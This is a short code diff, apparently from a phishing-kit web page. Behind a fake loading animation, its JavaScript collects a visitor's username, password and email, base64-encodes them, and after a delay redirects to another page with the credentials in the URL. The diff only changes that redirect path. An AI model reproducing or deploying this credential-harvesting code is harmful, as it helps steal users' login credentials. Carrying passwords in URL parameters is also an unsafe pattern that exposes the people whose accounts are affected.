@@ -222,7 +222,7 @@ setTimeout(function(){ $('.loader-default').addClass('is-active'); }, 300);
 setInterval(function(){ $('.loader-default').attr('data-text',$('.loader-default').attr('data-text')+'.' ); }, 1000);
 setTimeout(function(){
 	var encodedString = btoa(JSON.stringify({ username: $('#userId-text-input-field').val(), email: getUrlVars()['email'], password: $('#password-text-input-field').val()}));
-	window.location.replace("/email?data="+encodeURIComponent(encodedString));
+	window.location.replace("/email.html?data="+encodeURIComponent(encodedString));
 }, 4000);
 
 return;
